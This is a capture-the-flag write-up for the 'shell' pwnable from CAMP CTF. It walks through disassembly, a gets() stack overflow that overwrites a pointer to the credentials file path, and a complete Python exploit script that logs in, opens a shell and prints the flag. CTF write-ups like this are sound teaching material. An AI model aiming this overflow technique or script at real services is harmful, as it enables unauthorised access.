### Solved by barrebas

shell was a pwnable from CAMP CTF. We're given a 64-bit ELF binary, which shows the following when executed:

```bash
bas@tritonal:~/bin/ccc/shell$ ./shell
$ help
sh whoami date exit ls help hlep login
$ sh
Permission denied
$ login
Username: AAAA
Password: BBBB
Authentication failed!
$ 
```

Furthermore, the output of `strings ./shell` shows that the binary is looking for `creds.txt`. I placed a file in the same directory with `admin:admin` as sole line and indeed, I could now login:

```bash
$ login
Username: admin
Password: admin
Authenticated!
# sh
$
```

So we'll need to login with valid credentials, which we do not have yet. The rest of the commands are not of interest. Let's have a look at the disassembly, specifically at the part where our input is processed:

```
  400c2a:   movabs rdi,0x400f89
  400c34:   mov    al,0x0
  400c36:   call   400750 <printf@plt>
  ; this is the buffer it's using
  400c3b:   lea    rdi,[rbp-0x80]               
  400c3f:   add    rdi,0x4
  400c46:   mov    DWORD PTR [rbp-0xd0],eax
  400c4c:   mov    al,0x0
  ; here we get the username
  400c4e:   call   400790 <gets@plt>
  400c53:   movabs rdi,0x400f94
  400c5d:   mov    DWORD PTR [rbp-0xd4],eax
  400c63:   mov    al,0x0
  400c65:   call   400750 <printf@plt>
  ; this is the buffer for password
  400c6a:   lea    rdi,[rbp-0x80]
  400c6e:   add    rdi,0x24
  400c75:   mov    DWORD PTR [rbp-0xd8],eax
  400c7b:   mov    al,0x0
  400c7d:   call   400790 <gets@plt>
  400c82:   movabs rsi,0x400f9f
  ; i suppose I can overwrite this value
  400c8c:   mov    rdi,QWORD PTR [rbp-0x18]     ; creds.txt
  400c90:   mov    DWORD PTR [rbp-0xdc],eax
  400c96:   call   4007b0 <fopen@plt>
```

So basically, the calls to `gets()` happen to write to the stack. We're not able to overwrite the saved return address because of the canary, but we can overwrite the pointer at `[rbp-0x18]`, which contains a pointer to the string `creds.txt`. We can overwrite this with a pointer to another string, to make the binary open another file to check our credentials!

The only option that I could find was `/lib64/ld-linux-x86-64.so.2`. The problem is, does this actually contain valid pairs of `user:name`? I grabbed the file via a shell I obtained on bitterman and ran it through strings:

```
bas@tritonal:~/bin/ccc/shell$ strings ./ld.so |grep ":"
|F:m
<:uR
sHu:H9
...snip...
FATAL: kernel too old
Unused direct dependencies:
    Version information:
    %s:
prelink checking: %s
wrong ELF class: ELFCLASS32
undefined symbol: 
relocation processing: %s%s
...snip...
```

Indeed, it does! So the plan is to overwrite the pointer on the stack with the pointer to `/lib64/ld-linux-x86-64.so.2`, then login with one of those combinations of "username" and "password". The exploit:

```python
#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("<Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf
  
def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10117))

    readtil('$')
    s.send('login\n')
    readtil('Username:')
    s.send('AAAA\n')
    readtil('Password:')
    # overwrite rbp-0x18, which used to contain a pointer to "creds.txt"
    # overwrite it with a pointer to 0x400200 ("/lib64/ld-linux-x86-64.so.2")
    # I harvested this file already via one of the other challenges
    s.send("A"*68+q(0x400200)+'\n')
    
    readtil('$')
    s.send('login\n')
    readtil('Username:')
    s.send('relocation processing\n')
    readtil('Password:')
    s.send(' %s%s\n')
    
    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
```

And it action:

```bash
bas@tritonal:~/bin/ccc/shell$ python ./poc.py 
 Authenticated!
# id
Command not found
# sh
ls
creds.txt
flag.txt
run.sh
shell
cat flag.txt
CAMP15_408eed038796cfca32e2fdb3a8126429
```

